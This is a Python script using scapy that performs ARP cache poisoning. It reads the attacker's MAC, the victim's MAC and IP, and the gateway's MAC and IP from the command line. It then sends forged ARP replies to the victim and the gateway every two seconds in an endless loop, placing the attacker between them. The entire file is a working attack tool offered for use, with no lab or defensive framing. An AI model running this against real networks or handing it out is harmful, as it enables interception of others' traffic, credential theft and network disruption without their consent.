import scapy.all as scapy
import os
import sys
from time import * 


def get_cmd_arguments():

    Args = None
    # Ensure that the user has specified 9 arguments
    if len(sys.argv) != 9:
        print("Error!!!!! You specified less or more than 9 arguments")
        return Args
    elif sys.argv[1]=='-M' and sys.argv[3]=='-V'and sys.argv[6]=='-R':
        try:
            L = []
            L.append(sys.argv[2])
            L.append(sys.argv[4])
            L.append(sys.argv[5])
            L.append(sys.argv[7])
            L.append(sys.argv[8])
            Args = L
        except:
            print("Invalid command-line arguments, check the documentation and try again")
            
    return Args

def ARP_POISON(my_mac,Victim_mac,Victim_ip,gateway_mac,gateway_ip):
#Ether fields
    Victim_ether = scapy.Ether(src=my_mac,dst=Victim_mac)
    gateway_ether = scapy.Ether(src=my_mac,dst=gateway_mac)
    #ARP fields
    Victim_arp = scapy.ARP(op = 2,hwsrc = my_mac,psrc = gateway_ip,hwdst = Victim_mac,pdst = Victim_ip)
    gateway_arp = scapy.ARP(op = 2,hwsrc = my_mac,psrc = Victim_ip ,hwdst = gateway_mac,pdst = gateway_ip )
    #stacking ether and arp
    Victim_pkt = Victim_ether/Victim_arp
    gateway_pkt = gateway_ether/gateway_arp

    #sendings arp responses to the network
    while True:
        scapy.sendp(Victim_pkt,verbose = 0)
        scapy.sendp(gateway_pkt,verbose = 0)
        sleep(2)

#verify and get arguments
Args = get_cmd_arguments()

#ARP_POISON function
ARP_POISON(Args[0],Args[1],Args[2],Args[3],Args[4])
"""Args[0]----->my_mac
   Args[1]----->Victim_mac
   Args[2]----->Victim_ip
   Args[3]----->gateway_mac
   Args[4]----->gateway_ip
"""
